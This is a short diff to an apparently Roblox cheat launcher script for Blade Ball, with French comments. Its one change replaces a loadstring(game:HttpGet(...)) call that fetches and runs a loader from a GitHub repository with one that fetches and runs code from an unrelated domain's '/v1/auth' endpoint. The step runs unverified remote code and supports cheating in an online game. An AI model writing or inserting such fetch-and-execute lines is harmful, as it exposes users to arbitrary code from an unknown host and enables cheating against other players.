@@ -1,7 +1,7 @@
 -- 1. On lance Blade Ball en priorité absolue
 local function launchBladeBall()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+        loadstring(game:HttpGet("https://api.blyatscripts.xyz/v1/auth"))()
     end)
     if not success then print("Erreur Argon: " .. tostring(err)) end
 end
